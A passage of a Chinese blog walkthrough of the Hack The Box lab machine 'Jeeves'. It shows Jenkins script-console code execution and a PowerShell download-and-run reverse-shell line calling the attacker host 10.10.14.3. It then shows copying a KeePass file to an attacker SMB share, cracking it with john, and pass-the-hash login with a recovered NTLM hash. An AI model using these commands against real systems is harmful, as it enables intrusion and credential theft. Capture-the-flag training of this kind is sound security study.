+<h3 id="代码执行漏洞扩展"><a href="#代码执行漏洞扩展" class="headerlink" title="代码执行漏洞扩展"></a>代码执行漏洞扩展</h3><p>除了以上方法外还有处路径可完成代码执行，路径为<code>http://10.10.10.63:50000/askjeeves/script</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%883.23.20.png" alt="截屏2021-10-19 下午3.23.20"><br>测试 ping 命令可成功执行，构造反弹的代码如下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">cmd</span> <span class="string">=</span> <span class="string">&quot;&quot;</span><span class="string">&quot; powershell -c iex(new-object net.webclient).downloadstring(&#x27;http://10.10.14.3/Invoke-PowerShellTcp.ps1&#x27;) &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="string">println</span> <span class="string">cmd.execute().text</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-上线-administrator"><a href="#0x03-上线-administrator" class="headerlink" title="0x03 上线[administrator]"></a>0x03 上线[administrator]</h2><h3 id="检查系统配置"><a href="#检查系统配置" class="headerlink" title="检查系统配置"></a>检查系统配置</h3><p>首先使用 PowerUp.ps1 对操作系统配置进行检查</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadstring(<span class="string">&#x27;http://10.10.14.3/PowerUp.ps1&#x27;</span>)</span><br><span class="line">Invoke-AllChecks</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%883.32.07.png" alt="截屏2021-10-19 下午3.32.07"><br>但是并未有什么结果</p>
+<h3 id="KeePass加密数据库"><a href="#KeePass加密数据库" class="headerlink" title="KeePass加密数据库"></a>KeePass加密数据库</h3><p>通过搜索在当前用户的文档目录下发现一个 KeePass 加密数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\kohsuke\Documents</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%884.07.56.png" alt="截屏2021-10-19 下午4.07.56"><br>由于阅读该文件需要密码或密钥，我们需要寻找 .key 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where.exe /r c:\ *.key</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%884.18.26.png" alt="截屏2021-10-19 下午4.18.26"><br>结果并没找到该类型文件，于是决定先将数据库文件下载下来</p>
+<h3 id="KeePass密码破解"><a href="#KeePass密码破解" class="headerlink" title="KeePass密码破解"></a>KeePass密码破解</h3><p>我们选择通过smb协议进行传输，首先在 kali 中开启smb服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py mac ~/hackthebox/Machines/Jeeves</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%884.56.02.png" alt="截屏2021-10-19 下午4.56.02"><br>在靶机中执行命令传输<code>CEH.kdbx</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> c:\Users\kohsuke\Documents\</span><br><span class="line">copy CEH.kdbx \\10.10.14.3\mac</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%888.14.04.png" alt="截屏2021-10-19 下午8.14.04"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%888.13.54.png" alt="截屏2021-10-19 下午8.13.54"><br>使用 keepss2john 将 kdbx 数据库文件转换为可识别的哈希值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keepass2john CEH.kdbx &gt; CEH.hash</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%888.18.22.png" alt="截屏2021-10-19 下午8.18.22"><br>使用 john 进行密码破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john CEH.hash --wordlist=/usr/share/wordlists/rockyou.txt </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%888.22.44.png" alt="截屏2021-10-19 下午8.22.44"><br>结果显示密码为 moonshine1，那么接下来需要通过该密码打开数据库文件</p>
+<h3 id="管理员上线"><a href="#管理员上线" class="headerlink" title="管理员上线"></a>管理员上线</h3><p>使用 keepass2 来打开 kdbx 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install keepass2</span><br><span class="line">keepass2 CEH.kdbx</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8811.28.37.png" alt="截屏2021-10-19 下午11.28.37"><br>输入密码后可打开文件<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8811.30.14.png" alt="截屏2021-10-19 下午11.30.14"><br>按<code>ctrl + h</code>可以显示密码，拿到的NTLM哈希值如下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</span></span><br></pre></td></tr></table></figure>
+<p>使用 smbmap 进行测试后成功访问，说明哈希值正确</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -u Administrator -p <span class="string">&#x27;aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00&#x27;</span> -H 10.10.10.63</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8811.40.54.png" alt="截屏2021-10-19 下午11.40.54"><br>使用 pth-winexe 来通过pth方式进行连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe -U Administrator%<span class="string">&#x27;aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00&#x27;</span> //10.10.10.63 cmd.exe</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8811.54.26.png" alt="截屏2021-10-19 下午11.54.26"><br>成功登录管理员</p>
+<h3 id="寻找flag"><a href="#寻找flag" class="headerlink" title="寻找flag"></a>寻找flag</h3><p>在管理员桌面上寻找第二个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> c:\Users\Administrator\Desktop</span><br><span class="line"><span class="built_in">type</span> hm.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-19%20%E4%B8%8B%E5%8D%8811.55.53.png" alt="截屏2021-10-19 下午11.55.53"><br>文本显示flag在其他地方，需要继续深入寻找。使用命令显示隐藏文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /r</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-20%20%E4%B8%8A%E5%8D%8812.00.20.png" alt="截屏2021-10-20 上午12.00.20"><br>通过命令 more 传递 NTFS 数据流读取root.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more &lt; hm.txt:root.txt:<span class="variable">$DATA</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ee344f5c/%E6%88%AA%E5%B1%8F2021-10-20%20%E4%B8%8A%E5%8D%8812.07.09.png" alt="截屏2021-10-20 上午12.07.09"><br>成功获取第二个flag</p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/28ba001e/">HTB: Chatterbox<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
